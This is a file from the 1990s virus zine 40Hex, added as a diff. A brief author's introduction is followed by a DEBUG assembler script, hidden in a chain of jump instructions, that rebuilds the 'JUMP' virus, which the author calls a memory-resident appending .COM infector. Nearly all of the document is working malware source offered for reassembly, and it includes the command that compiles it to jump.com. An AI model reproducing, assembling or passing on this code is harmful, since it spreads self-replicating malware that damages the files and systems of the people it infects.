@@ -1,0 +1,160 @@
+40Hex Number 14 Volume 5 Issue 1                                      File 011
+
+The following is a DEBUG script for my old JUMP virus, written sometime
+in the summer of '94 or so I think.  I had gotten bored as hell, and couldn't
+think of much that hadn't been done with viruses, so I came up with this
+thing.... anyway, I didn't make it the typical  "e 100 xx xx" type debug 
+script, 'cause I wanted people to be able to see how it got its name.  
+It can be reassembled the same as any debug script, just debug <jump.scr.
+Aside from its most obvious trait, it is a memory resident appending .com 
+infector.
+
+                                        -Stormbringer
+
+------------------------- cut here for jump.scr ------------------------
+a 100
+jmp     near 0104                               
+jmp     5D00:00E8                          
+jmp     010B                               
+jmp     0107:ED81                          
+jmp     0112                               
+jmp     DB33:4AB4                          
+jmp     0119                               
+jmp     9021:CD4B                          
+jmp     0120                               
+jmp     9031:EB83                          
+jmp     0127                               
+jmp     21CD:4AB4                          
+jmp     012E                               
+jmp     9000:30BB                          
+jmp     0135                               
+jmp     21CD:48B4                          
+jmp     013C                               
+jmp     9000:102D                          
+jmp     0143                               
+jmp     9090:C08E                          
+jmp     014A                               
+jmp     9000:F0BF                          
+jmp     0151                               
+jmp     90AA:5AB0                          
+jmp     0158                               
+jmp     ABC0:8C90                          
+jmp     015F                               
+jmp     0601:00BF                          
+jmp     0166                               
+jmp     0100:B68D                          
+jmp     016D                               
+jmp     5001:83B8                          
+jmp     0174                               
+jmp     9001:D2B9                          
+jmp     017B                               
+jmp     90CB:A4F2                          
+jmp     0383                               
+jmp     071F:061E                          
+jmp     018A                               
+jmp     9001:00BF                          
+jmp     0191                               
+jmp     A501:E3BE                          
+jmp     0198                               
+jmp     90C0:33A4                          
+jmp     019F                               
+jmp     90FA:D88E                          
+jmp     01A6                               
+jmp     9001:F5B8                          
+jmp     01AD                               
+jmp     0084:0687                          
+jmp     01B4                               
+jmp     02D2:A32E                          
+jmp     01BB                               
+jmp     9090:C88C                          
+jmp     01C2                               
+jmp     0086:0687                          
+jmp     01C9                               
+jmp     02D4:A32E                          
+jmp     01D0                               
+jmp     1F06:06FB                          
+jmp     01D7                               
+jmp     5701:00BF                          
+jmp     01DE                               
+jmp     0000:E9CB                          
+jmp     0020:CD90                          
+jmp     504D:554A                          
+jmp     4442                               
+jmp     5D53:505B                          
+jmp     904B:003D                          
+jz      01FE                               
+jmp     02D1                               
+jmp     0201                               
+jmp     5251:5350                          
+jmp     0208                               
+jmp     5756:061E                          
+jmp     020F                               
+jmp     3D02:B890                          
+jmp     0216                               
+jmp     0373:21CD                          
+jmp     02C6                               
+jmp     0220                               
+jmp     01E3:BA93                          
+jmp     0227                               
+jmp     0003:B90E                          
+jmp     022E                               
+jmp     903F:B41F                          
+jmp     0235                               
+jmp     9090:21CD                          
+jmp     023C                               
+jmp     01E3:3E80                          
+jmp     7EB7                               
+jmp     0246                               
+jmp     9001:E3BE                          
+jmp     024D                               
+jmp     904D:3C80                          
+jz      02BF                               
+jmp     0256                               
+jmp     9042:02B8                          
+jmp     025D                               
+jmp     D233:C933                          
+jmp     0264                               
+jmp     9090:21CD                          
+jmp     026B                               
+jmp     9000:032D                          
+jmp     0272                               
+jmp     9001:E0A3                          
+jmp     0279                               
+jmp     9090:40B4                          
+jmp     0280                               
+jmp     FB01:00BA                          
+jmp     0287                               
+jmp     9001:D2B9                          
+jmp     028E                               
+jmp     C933:21CD                          
+jmp     0295                               
+jmp     9042:00B8                          
+jmp     029C                               
+jmp     21CD:D233                          
+jmp     02A3                               
+jmp     FBFA:40B4                          
+jmp     02AA                               
+jmp     9001:DFBA                          
+jmp     02B1                               
+jmp     0003:B990                          
+jmp     02B8                               
+jmp     9090:21CD                          
+jmp     02BF                               
+jmp     21CD:3EB4                          
+jmp     02C6                               
+jmp     1F07:5E5F                          
+jmp     02CD                               
+jmp     585B:595A                          
+jmp     0000:0000                          
+
+rcx
+1d6
+rbx
+0
+n jump.com
+w 100
+q
+
+
+------------------------- end of jump.scr ---------------------------
+
